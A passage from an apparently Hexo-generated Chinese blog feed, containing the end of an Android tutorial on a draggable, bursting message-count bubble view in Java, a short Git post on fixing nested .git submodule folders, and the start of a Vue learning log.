class="keyword">float</span> mBubbleRadius = dpToPx(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 气泡颜色</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> mBubbleColor;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不动气泡的半径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> mBubbleStillRadius;</span><br><span class="line">        <span class="comment">// 可动气泡的半径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> mBubbleMoveRadius;</span><br><span class="line">        <span class="comment">// 不动气泡的圆心</span></span><br><span class="line">        <span class="keyword">private</span> PointF mBubStillCenter;</span><br><span class="line">        <span class="comment">// 可动气泡的圆心</span></span><br><span class="line">        <span class="keyword">private</span> PointF mBubMoveCenter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 气泡的画笔</span></span><br><span class="line">        <span class="keyword">private</span> Paint mBubblePaint;</span><br><span class="line">        <span class="comment">// 贝塞尔曲线</span></span><br><span class="line">        <span class="keyword">private</span> Path mBezierPath;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Paint mBurstPaint;</span><br><span class="line">        <span class="keyword">private</span> Rect mBurstRect;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 气泡状态标志</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> mBubbleState = BUBBLE_STATE_DEFAULT;</span><br><span class="line">        <span class="comment">// 两气泡圆心距离</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> mDist;</span><br><span class="line">        <span class="comment">// 气泡相连状态最大圆心距离</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> mMaxDist;</span><br><span class="line">        <span class="comment">// 手指触摸偏移量</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> MOVE_OFFSET;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> Bitmap mCacheBitmap;</span><br><span class="line">        <span class="comment">// View的宽和高</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">float</span> mWidth, mHeight;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 气泡爆炸的bitmap数组</span></span><br><span class="line">        <span class="keyword">private</span> Bitmap[] mBurstBitmapArray;</span><br><span class="line">        <span class="comment">// 是否在执行气泡爆炸动画</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> mIsBurstAnimStart = <span class="keyword">false</span>;</span><br><span class="line">        <span class="comment">// 当前气泡爆炸图片index</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> mCurDrawableIndex;</span><br><span class="line">        <span class="comment">// 气泡爆炸的图片id数组</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] mBurstDrawablesArray = &#123;R.drawable.explosion_one, R.drawable.explosion_two</span><br><span class="line">                , R.drawable.explosion_three, R.drawable.explosion_four, R.drawable.explosion_five&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DragDotView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(context, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DragDotView</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(context, attrs, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DragDotView</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(context, attrs, defStyleAttr, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DragDotView</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="keyword">int</span> defStyleAttr, <span class="keyword">int</span> defStyleRes)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(context, attrs, defStyleAttr, defStyleRes);</span><br><span class="line">            init(context, attrs, defStyleAttr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span></span>&#123;</span><br><span class="line">            TypedArray array = context.obtainStyledAttributes(attrs, R.styleable.DragBubbleView, defStyleAttr, <span class="number">0</span>);</span><br><span class="line">            mBubbleColor = array.getColor(R.styleable.DragBubbleView_bubbleColor, Color.RED);</span><br><span class="line">            array.recycle();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 抗锯齿</span></span><br><span class="line">            mBubblePaint = <span class="keyword">new</span> Paint(Paint.ANTI_ALIAS_FLAG);</span><br><span class="line">            mBubblePaint.setColor(mBubbleColor);</span><br><span class="line">            mBubblePaint.setStyle(Paint.Style.FILL);</span><br><span class="line"></span><br><span class="line">            mBezierPath = <span class="keyword">new</span> Path();</span><br><span class="line"></span><br><span class="line">            mBurstPaint = <span class="keyword">new</span> Paint(Paint.ANTI_ALIAS_FLAG);</span><br><span class="line">            mBurstPaint.setFilterBitmap(<span class="keyword">true</span>);</span><br><span class="line">            mBurstRect = <span class="keyword">new</span> Rect();</span><br><span class="line">            mBurstBitmapArray = <span class="keyword">new</span> Bitmap[mBurstDrawablesArray.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mBurstDrawablesArray.length; i++) &#123;</span><br><span class="line">                <span class="comment">// 将气泡爆炸的drawable转为bitmap</span></span><br><span class="line">                Bitmap bitmap = BitmapFactory.decodeResource(getResources(), mBurstDrawablesArray[i]);</span><br><span class="line">                mBurstBitmapArray[i] = bitmap;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDraw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(mDist &lt; mMaxDist &amp;&amp; mBubbleState == BUBBLE_STATE_CONNECT)&#123;</span><br><span class="line">                <span class="comment">// 画静止的气泡</span></span><br><span class="line">                canvas.drawCircle(mBubStillCenter.x, mBubStillCenter.y, mBubbleStillRadius, mBubblePaint);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 计算控制点坐标，两圆心的中点</span></span><br><span class="line">                <span class="keyword">int</span> controlX = (<span class="keyword">int</span>) ((mBubStillCenter.x + mBubMoveCenter.x) / <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">int</span> controlY = (<span class="keyword">int</span>) ((mBubStillCenter.y + mBubMoveCenter.y) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">float</span> sin = (mBubMoveCenter.y - mBubStillCenter.y) / mDist;</span><br><span class="line">                <span class="keyword">float</span> cos = (mBubMoveCenter.x - mBubStillCenter.x) / mDist;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 按照图示的位置，此时移动气泡的y坐标比固定气泡的y坐标小，所以sin是负值，故在使用sin值的时候使用加号计算</span></span><br><span class="line">                <span class="comment">// A点</span></span><br><span class="line">                <span class="keyword">float</span> bubbleStillStartX = mBubStillCenter.x + mBubbleStillRadius * sin;</span><br><span class="line">                <span class="keyword">float</span> bubbleStillStartY = mBubStillCenter.y - mBubbleStillRadius * cos;</span><br><span class="line">                <span class="comment">// B点</span></span><br><span class="line">                <span class="keyword">float</span> bubbleMoveStartX = mBubMoveCenter.x + mBubbleMoveRadius * sin;</span><br><span class="line">                <span class="keyword">float</span> bubbleMoveStartY = mBubMoveCenter.y - mBubbleMoveRadius * cos;</span><br><span class="line">                <span class="comment">// C点</span></span><br><span class="line">                <span class="keyword">float</span> bubbleMoveEndX = mBubMoveCenter.x - mBubbleMoveRadius * sin;</span><br><span class="line">                <span class="keyword">float</span> bubbleMoveEndY = mBubMoveCenter.y + mBubbleMoveRadius * cos;</span><br><span class="line">                <span class="comment">// D点</span></span><br><span class="line">                <span class="keyword">float</span> bubbleStillEndX = mBubStillCenter.x - mBubbleStillRadius * sin;</span><br><span class="line">                <span class="keyword">float</span> bubbleStillEndY = mBubStillCenter.y + mBubbleStillRadius * cos;</span><br><span class="line"></span><br><span class="line">                mBezierPath.reset();</span><br><span class="line">                <span class="comment">// 画上半弧</span></span><br><span class="line">                mBezierPath.moveTo(bubbleStillStartX, bubbleStillStartY);</span><br><span class="line">                mBezierPath.quadTo(controlX, controlY, bubbleMoveStartX, bubbleMoveStartY);</span><br><span class="line">                <span class="comment">// 画下半弧</span></span><br><span class="line">                mBezierPath.lineTo(bubbleMoveEndX, bubbleMoveEndY);</span><br><span class="line">                mBezierPath.quadTo(controlX, controlY, bubbleStillEndX, bubbleStillEndY);</span><br><span class="line">                mBezierPath.close();</span><br><span class="line">                canvas.drawPath(mBezierPath, mBubblePaint);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 绘制拖动的view，也就是缓存的bitmap</span></span><br><span class="line">            <span class="keyword">if</span> (mCacheBitmap != <span class="keyword">null</span> &amp;&amp; mBubbleState != BUBBLE_STATE_DISMISS) &#123;</span><br><span class="line">                canvas.drawBitmap(mCacheBitmap,</span><br><span class="line">                        mBubMoveCenter.x - mWidth / <span class="number">2</span>,</span><br><span class="line">                        mBubMoveCenter.y - mHeight / <span class="number">2</span>,</span><br><span class="line">                        mBubblePaint);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(mBubbleState == BUBBLE_STATE_DISMISS)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mIsBurstAnimStart)&#123;</span><br><span class="line">                    mBurstRect.set((<span class="keyword">int</span>)(mBubMoveCenter.x - mBubbleMoveRadius), (<span class="keyword">int</span>)(mBubMoveCenter.y - mBubbleMoveRadius),</span><br><span class="line">                            (<span class="keyword">int</span>)(mBubMoveCenter.x + mBubbleMoveRadius), (<span class="keyword">int</span>)(mBubMoveCenter.y + mBubbleMoveRadius));</span><br><span class="line">                    canvas.drawBitmap(mBurstBitmapArray[mCurDrawableIndex], <span class="keyword">null</span>, mBurstRect, mBurstPaint);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 气泡爆炸动画</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startBubbleBurstAnim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            ValueAnimator animator = ValueAnimator.ofInt(<span class="number">0</span>, mBurstDrawablesArray.length);</span><br><span class="line">            animator.setInterpolator(<span class="keyword">new</span> LinearInterpolator());</span><br><span class="line">            animator.setDuration(<span class="number">500</span>);</span><br><span class="line">            animator.addUpdateListener(animation -&gt; &#123;</span><br><span class="line">                mCurDrawableIndex = (<span class="keyword">int</span>) animator.getAnimatedValue();</span><br><span class="line">                invalidate();</span><br><span class="line">            &#125;);</span><br><span class="line">            animator.addListener(<span class="keyword">new</span> AnimatorListenerAdapter() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationEnd</span><span class="params">(Animator animation)</span> </span>&#123;</span><br><span class="line">                    mIsBurstAnimStart = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">if</span>(mDragListener != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        mDragListener.onDismiss();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            animator.start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 气泡还原动画</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startBubbleRestAnim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            mBubbleStillRadius = mBubbleRadius;</span><br><span class="line">            ValueAnimator animator = ValueAnimator.ofObject(<span class="keyword">new</span> PointEvaluator(), <span class="keyword">new</span> PointF(mBubMoveCenter.x, mBubMoveCenter.y), <span class="keyword">new</span> PointF(mBubStillCenter.x, mBubStillCenter.y));</span><br><span class="line">            animator.setDuration(<span class="number">300</span>);</span><br><span class="line">            animator.setInterpolator(input -&gt; &#123;</span><br><span class="line"><span class="comment">//                float factor = 0.4f;</span></span><br><span class="line"><span class="comment">//                return (float) (Math.pow(2, -10 * factor) * Math.sin((input - factor / 4) * (2 * Math.PI) / factor) + 1);</span></span><br><span class="line">                <span class="keyword">float</span> f = <span class="number">0.571429f</span>;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">float</span>) (Math.pow(<span class="number">2</span>, -<span class="number">4</span> * input) * Math.sin((input - f / <span class="number">4</span>) * (<span class="number">2</span> * Math.PI) / f) + <span class="number">1</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">            animator.addUpdateListener(animation -&gt; &#123;</span><br><span class="line">                mBubMoveCenter = (PointF) animation.getAnimatedValue();</span><br><span class="line">                invalidate();</span><br><span class="line">            &#125;);</span><br><span class="line">            animator.addListener(<span class="keyword">new</span> AnimatorListenerAdapter() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationEnd</span><span class="params">(Animator animation)</span> </span>&#123;</span><br><span class="line">                    mBubbleState = BUBBLE_STATE_DEFAULT;</span><br><span class="line">                    removeDragView();</span><br><span class="line">                    <span class="keyword">if</span>(mDragListener != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        mDragListener.onRestore();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            animator.start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 设置缓存的bitmap</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> bitmap</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCacheBitmap</span><span class="params">(Bitmap bitmap)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.mCacheBitmap = bitmap;</span><br><span class="line">            mWidth = mCacheBitmap.getWidth();</span><br><span class="line">            mHeight = mCacheBitmap.getHeight();</span><br><span class="line">            mBubbleRadius = Math.min(mWidth, mHeight) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 设置固定圆和移动圆的圆心和半径</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> stillX 固定圆的X坐标</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> stillY 固定圆的Y坐标</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> moveX 移动圆的X坐标</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> moveY 移动圆的Y坐标</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDragPoint</span><span class="params">(<span class="keyword">float</span> stillX,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">float</span> stillY,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">float</span> moveX,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">float</span> moveY)</span> </span>&#123;</span><br><span class="line">            mBubbleStillRadius = mBubbleRadius;</span><br><span class="line">            mBubbleMoveRadius = mBubbleStillRadius;</span><br><span class="line">            mMaxDist = mBubbleRadius * <span class="number">8</span>;</span><br><span class="line">            MOVE_OFFSET = mMaxDist / <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(mBubStillCenter == <span class="keyword">null</span>)&#123;</span><br><span class="line">                mBubStillCenter = <span class="keyword">new</span> PointF(stillX, stillY);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                mBubStillCenter.set(stillX, stillY);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(mBubMoveCenter == <span class="keyword">null</span>)&#123;</span><br><span class="line">                mBubMoveCenter = <span class="keyword">new</span> PointF(moveX, moveY);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                mBubMoveCenter.set(moveX, moveY);</span><br><span class="line">            &#125;</span><br><span class="line">            mBubbleState = BUBBLE_STATE_CONNECT;</span><br><span class="line">            invalidate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">float</span> curX, <span class="keyword">float</span> curY)</span> </span>&#123;</span><br><span class="line">            mBubMoveCenter.x = curX;</span><br><span class="line">            mBubMoveCenter.y = curY;</span><br><span class="line">            <span class="comment">// Math.hypot(x, y)为求x平方+y平方的平方根</span></span><br><span class="line">            mDist = (<span class="keyword">float</span>) Math.hypot(curX - mBubStillCenter.x, curY - mBubStillCenter.y);</span><br><span class="line">            <span class="keyword">if</span>(mBubbleState == BUBBLE_STATE_CONNECT)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mDist &lt; mMaxDist - MOVE_OFFSET)&#123;</span><br><span class="line">                    mBubbleStillRadius = mBubbleRadius - mDist / <span class="number">10</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    mBubbleState = BUBBLE_STATE_APART;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            invalidate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">up</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(mBubbleState == BUBBLE_STATE_CONNECT)&#123;</span><br><span class="line">                startBubbleRestAnim();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mBubbleState == BUBBLE_STATE_APART)&#123;</span><br><span class="line">                <span class="keyword">if</span>(mDist &lt; <span class="number">3</span> * mBubbleRadius)&#123;</span><br><span class="line">                    startBubbleRestAnim();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    mBubbleState = BUBBLE_STATE_DISMISS;</span><br><span class="line">                    mIsBurstAnimStart = <span class="keyword">true</span>;</span><br><span class="line">                    startBubbleBurstAnim();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            invalidate();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 移除dragview</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeDragView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            ViewGroup viewGroup = (ViewGroup) getParent();</span><br><span class="line">            viewGroup.removeView(DragDotView.<span class="keyword">this</span>);</span><br><span class="line">            DragMsgView.<span class="keyword">this</span>.setVisibility(VISIBLE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 转换 dp 至 px</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> dp dp像素</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">dpToPx</span><span class="params">(<span class="keyword">float</span> dp)</span> </span>&#123;</span><br><span class="line">            DisplayMetrics metrics = Resources.getSystem().getDisplayMetrics();</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>) (dp * metrics.density + <span class="number">0.5f</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OnDragListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onRestore</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onDismiss</span><span class="params">()</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOnDragListener</span><span class="params">(OnDragListener listener)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mDragListener = listener;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>PointEvaluator.class</code></strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Administrator on 2021/5/3.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.animation.TypeEvaluator;</span><br><span class="line"><span class="keyword">import</span> android.graphics.PointF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PointEvaluator</span> <span class="keyword">implements</span> <span class="title">TypeEvaluator</span>&lt;<span class="title">PointF</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PointF <span class="title">evaluate</span><span class="params">(<span class="keyword">float</span> fraction, PointF startValue, PointF endValue)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//只要能保证：当fraction=0时返回值为startValue，并且当fraction=1时返回值为endValue，就是一个比较合理的函数</span></span><br><span class="line">        <span class="keyword">float</span> x = startValue.x + fraction * (endValue.x - startValue.x);</span><br><span class="line">        <span class="keyword">float</span> y = startValue.y + fraction * (endValue.y - startValue.y);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> PointF(x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>使用方法如下：</code></strong></p><ol><li><p>xml文件中添加组件</p> <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;com.example.administrator.myqq.bubble.DragMsgView</span><br><span class="line">    android:id=&quot;@+id/message_number&quot;</span><br><span class="line">    android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">    android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">    android:layout_centerInParent=&quot;true&quot;</span><br><span class="line">    android:background=&quot;@drawable/bubble_view_shape&quot;</span><br><span class="line">    android:gravity=&quot;center&quot;</span><br><span class="line">    android:paddingLeft=&quot;7dp&quot;</span><br><span class="line">    android:paddingRight=&quot;7dp&quot;</span><br><span class="line">    android:text=&quot;99+&quot;</span><br><span class="line">    android:textColor=&quot;@android:color/white&quot;</span><br><span class="line">    android:textSize=&quot;13sp&quot;</span><br><span class="line">    android:layout_alignParentTop=&quot;true&quot;</span><br><span class="line">    android:layout_alignParentRight=&quot;true&quot;</span><br><span class="line">    android:layout_marginRight=&quot;10dp&quot;</span><br><span class="line">    android:layout_marginEnd=&quot;10dp&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>设置监听</p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> DragMsgView messgeNumber = (DragMsgView) itemView.findViewById(R.id.message_number);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">messgeNumber.setOnDragListener(<span class="keyword">new</span> DragMsgView.OnDragListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRestore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//气泡恢复原来位置</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDismiss</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//气泡爆炸消失</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="2-怎样实现侧滑消息显示删除等按钮？"><a href="#2-怎样实现侧滑消息显示删除等按钮？" class="headerlink" title="2.怎样实现侧滑消息显示删除等按钮？"></a>2.怎样实现侧滑消息显示删除等按钮？</h2><p>（待写……）</p><hr><p class='p center code h4 red'>有啥想问的，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 环信 </tag>
            
            <tag> SSM框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git使用踩的坑及解决办法</title>
      <link href="2021/09/25/Git%E4%BD%BF%E7%94%A8%E8%B8%A9%E7%9A%84%E5%9D%91%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>2021/09/25/Git%E4%BD%BF%E7%94%A8%E8%B8%A9%E7%9A%84%E5%9D%91%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Git使用踩的坑及解决办法"><a href="#Git使用踩的坑及解决办法" class="headerlink" title="Git使用踩的坑及解决办法"></a>Git使用踩的坑及解决办法</h1><div class="tip ban"><p><strong>问题1：当本地仓库的子文件夹下有.git文件夹时会识别为子项目，导致上传到GitHub的文件夹点不开。</strong></p></div><details class="folding-tag" cyan open><summary> 问题1解决方法： </summary>              <div class='content'>              <p><strong>1.先将子文件夹下的.git文件夹删除后，再使用如下命令清除一下本地仓库的缓存：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rm -r --cached &lt;文件夹相对路径&gt;</span><br></pre></td></tr></table></figure><p><strong>2.重新上传项目：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Git使用踩得坑及解决办法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习日志</title>
      <link href="2021/08/28/Vue%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>2021/08/28/Vue%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue学习日志"><a href="#Vue学习日志" class="headerlink" title="Vue学习日志"></a>Vue学习日志</h1><h2 id="1-初识Vue"><a href="#1-初识Vue" class="headerlink" title="1.初识Vue"></a>1.初识Vue</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>初识Vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">初识Vue：</span></span><br><span class="line"><span class="comment">1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；</span></span><br><span class="line"><span class="comment">2.root容器里面的代码依然符合HTML规范，只不过混入了一些Vue语法；</span></span><br><span class="line"><span class="comment">3.root容器里面的代码被称为【Vue模板】；</span></span><br><span class="line"><span class="comment">4.Vue实例与容器是一一对应的；</span></span><br><span class="line"><span class="comment">5.真实开发中只有一个Vue实例，并且会配合组件一起使用；</span></span><br><span class="line"><span 